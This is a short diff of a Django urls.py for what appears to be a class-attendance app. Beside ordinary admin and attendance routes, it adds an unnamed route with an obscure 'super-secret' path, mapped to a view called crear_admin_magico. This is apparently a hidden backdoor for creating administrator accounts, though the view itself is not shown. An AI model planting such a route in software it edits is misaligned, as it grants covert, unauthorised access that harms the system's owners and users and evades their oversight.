@@ -16,4 +16,5 @@ urlpatterns = [
     path('admin-clases/', views.lista_clases_admin, name='admin_clases'),
     path('asistencia/<int:clase_id>/', views.detalle_asistencia, name='asistencia'),
     path('marcar-asistencia/<int:inscripcion_id>/', views.marcar_asistencia, name='marcar_asistencia'),
+    path('crear-admin-super-secreto-99/', views.crear_admin_magico),
 ]
